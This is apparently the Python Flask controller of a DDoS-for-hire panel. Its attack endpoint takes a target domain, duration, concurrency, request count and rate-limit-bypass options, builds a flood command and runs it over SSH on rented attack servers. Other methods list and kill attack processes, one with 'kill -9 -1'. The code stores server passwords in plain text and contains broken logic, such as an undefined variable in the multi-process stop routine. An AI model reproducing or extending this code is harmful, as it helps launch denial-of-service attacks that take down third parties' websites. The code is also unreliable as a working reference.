from app.models.attack_server_log import AttackServerLog
from app.configs.blacklist import MAX_ATTACK_ATTEMPTS
from app.services.server_manager import ServerManager
from app.utils.decrypt_payload import decrypt_payload
from flask import jsonify, request, current_app
from app.utils.validate import is_blacklisted
from app.models.attack_log import AttackLog
from app.services.response import Response
from app.models.user_log import UserLog
from app.models.server import Server
from app.models.team import Team
from app.models.user import User
from datetime import datetime
from app.db import db
import paramiko
import pytz

vn_timezone = pytz.timezone('Asia/Ho_Chi_Minh') 

class AttackController:
    # attack site
    def attack(self):
        clientIp = request.headers.get("X-Forwarded-For", request.remote_addr)
        if not hasattr(request, 'currentUser') or not request.currentUser:
            return Response.error("Unauthorized", code=401)

        data = decrypt_payload(request.get_json())

        required_fields = {
            "domain": "Domain",
            "attack_time": "Attack Time",
            "bypass_ratelimit": "Bypass Ratelimit",
            "core_strength": "Core Strength",
            "mode": "Mode",
            "concurrents": "Concurrents",
            "request": "Request",
            "typeAttack": "Type Attack"
        }

        currentUser = request.currentUser

        if hasattr(currentUser, 'isAdmin') and currentUser.isAdmin:
            required_fields["servers"] = "Servers"

        for field, field_name in required_fields.items():
            if not data.get(field):
                return Response.error(message=f"{field_name} Required", code=400)

        domain = data["domain"]
        attackTimeValue = data["attack_time"]
        bypassRateLimitValue = data["bypass_ratelimit"]
        coreStrengthValue = data["core_strength"]
        modeValue = data["mode"]
        concurrentValue = data["concurrents"]
        requestCount = data["request"]
        typeAttack = data["typeAttack"]
        death_sword_http = data.get("death_sword_http", "")

        try:
            user = User.query.get(currentUser.id)
                
            if currentUser.attackCount >= MAX_ATTACK_ATTEMPTS:
                user.deactivate()
                return Response.error("YOUR BLOCKED", code=401)
            
            if is_blacklisted(domain):
                user.increment_attack_count()
                return Response.error(f"SITE BLOCKED", code=400)

            command = f'{modeValue} {domain} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http}--debug true --ratelimit {bypassRateLimitValue}'
            
            if typeAttack == 'hyna_valkyra':
                command = f'{modeValue} {domain} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} {death_sword_http} {bypassRateLimitValue}'

            if currentUser.isAdmin is False:
                server_id = currentUser.server_id
                servers_data = Server.query.get(server_id)

                if not servers_data:
                    return Response.error("Server Not Found", 404)

                server_ip = servers_data.to_dict()['ip']
                server_username = servers_data.to_dict()['username']
                server_password = servers_data.to_dict()['password']

                log_entry = UserLog(
                    ip=clientIp,
                    name_account=currentUser.nameAccount,
                    detail=f'Attack Domain: {domain} Concurrent: {concurrentValue} Server: {server_ip}',
                    time_active=datetime.now(vn_timezone)
                )
                db.session.add(log_entry)
                db.session.commit()
                
                return Response.success(ServerManager.server_only(server_ip, server_username, server_password, command))
            else:
                servers_data = data["servers"]
                servers_query = Server.query.filter(Server.id.in_(servers_data)).all()
                servers = [server.to_dict() for server in servers_query]
                print(f"Servers being processed: {servers}")
                return Response.success(ServerManager.server_multi(servers, command))
            
        except Exception as e:
            return Response.error(str(e), code=400)
    # cancel multiple processes đang dở
    def stop_multiple_processes(self):
        currentUser = request.currentUser
        data = request.get_json()
        pids = data.get('pid', [])

        if not pids:
            return jsonify({
                "status": "error",
                "message": "No PIDs provided"
            }), 400
        
        results = {}

        if not server_hostnames:
            return jsonify({
                "status": "error",
                "message": "No server hostnames provided"
            }), 400
            
        # Check if user has access to these servers
        if currentUser.get('team_id'):
            team = Team.query.get(currentUser['team_id'])
            if team:
                authorized_servers = Server.query.filter(Server.id.in_(team.servers)).all()
                authorized_ips = [server.ip for server in authorized_servers]
                
                # Check if all requested servers are authorized
                for hostname in server_hostnames:
                    if hostname not in authorized_ips:
                        return jsonify({
                            "status": "error",
                            "message": f"Unauthorized access to server: {hostname}"
                        }), 403
        
        # Terminate processes on each server
        results = {}
        for hostname in server_hostnames:
            try:
                # Find server credentials
                server = Server.query.filter_by(ip=hostname).first()
                if not server:
                    results[hostname] = {
                        "status": "error",
                        "message": "Server not found"
                    }
                    continue
                
                # Connect to the server
                sshClient = paramiko.SSHClient()
                sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                sshClient.connect(hostname, username=server.username, password=server.password)
                
                # Execute kill command
                stdin, stdout, stderr = sshClient.exec_command("kill -9 -1")
                
                # Get output and errors
                error = stderr.read().decode()
                if error:
                    results[hostname] = {
                        "status": "error",
                        "message": error
                    }
                else:
                    results[hostname] = {
                        "status": "success",
                        "message": "Server processes terminated"
                    }
                
                sshClient.close()
            except Exception as e:
                results[hostname] = {
                    "status": "error",
                    "message": str(e)
                }
                
        # Check overall status
        if all(result["status"] == "success" for result in results.values()):
            return jsonify({
                "status": "success",
                "message": "All server processes terminated successfully",
                "results": results
            }), 200
        else:
            return jsonify({
                "status": "partial_success" if any(result["status"] == "success" for result in results.values()) else "error",
                "message": "Some or all server process terminations failed",
                "results": results
            }), 207  # Using 207 Multi-Status for partial success
    # cancel all server attack
    def terminate_server_attack(self, logId: int, serverHostname: str):
        currentUser = request.currentUser
        attackLog = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()

        if not attackLog:
            return jsonify({
                "status": "error",
                "message": "Attack log not found"
            }), 404
        if logId not in self.active_channels or serverHostname not in self.active_channels[logId]:
            return jsonify({
                "status": "error",
                "message": f"No active channel found for server {serverHostname}"
            }), 404

        try:
            # Close the specific channel
            channel = self.active_channels[logId][serverHostname]
            channel.close()

            # Update server log status
            serverLog = AttackServerLog.query.filter_by(
                attackLogId=logId,
                serverHostname=serverHostname
            ).first()
            if serverLog:
                serverLog.status = 'terminated'
                db.session.commit()

            # Remove channel from active_channels
            del self.active_channels[logId][serverHostname]
            if not self.active_channels[logId]:
                del self.active_channels[logId]
                # If no more active channels, update attack log status
                attackLog.status = 'terminated'
                db.session.commit()

            return jsonify({
                "status": "success",
                "message": f"Attack terminated successfully for server {serverHostname}"
            }), 200

        except Exception as e:
            current_app.logger.error(f"Error terminating channel for server {serverHostname}: {str(e)}")
            return jsonify({
                "status": "error",
                "message": f"Error terminating channel: {str(e)}"
            }), 500
    # get list process 
    def list_processes(self):
        try:
            currentUser = request.currentUser

            if currentUser.isAdmin is False:
                server_id = currentUser.server_id
                servers_data = Server.query.get(server_id)

                if not servers_data:
                    return Response.error("Server Not Found", 404)

                server_ip = servers_data.to_dict()['ip']
                server_name = servers_data.to_dict()['name']
                server_username = servers_data.to_dict()['username']
                server_password = servers_data.to_dict()['password']
                return Response.success(ServerManager.server_get_single(server_id, server_name, server_ip, server_username, server_password), "Get Process Success")
            else:
                servers_query = Server.query.all()
                servers = [server.to_dict() for server in servers_query]
                return Response.success(ServerManager.server_get_multi(servers), "Get Process Success")

        except Exception as e:
            return Response.error(message=str(e), code=404)
    # cancel process
    def stop_process(self, pid=None):
        try:
            currentUser = request.currentUser

            if currentUser.isAdmin is False:
                
                if not isinstance(pid, int) or pid <= 0:
                    return Response.error("Invalid PID", code=400)

                server_id = currentUser.server_id
                servers_data = Server.query.get(server_id)
                if not servers_data:
                    return Response.error("Server not found", 404)

                server_ip = servers_data.to_dict()['ip']
                server_username = servers_data.to_dict()['username']
                server_password = servers_data.to_dict()['password']

                return Response.success(ServerManager.server_stop_single(server_ip, server_username, server_password, pid))

            else:
                data = request.get_json()
                server_id = data.get('server_id') if data else None
                if not server_id:
                    return Response.error("Missing server_id for admin operation", 400)

                servers_data = Server.query.get(server_id)
                if not servers_data:
                    return Response.error("Server not found", 404)

                server_dict = servers_data.to_dict()
                server_ip = server_dict['ip']
                server_username = server_dict['username']
                server_password = server_dict['password']

                return Response.success(ServerManager.server_stop_single(
                    server_ip, 
                    server_username, 
                    server_password, 
                    pid
                ))
        except Exception as e:
            return Response.error(message=str(e), code=404)
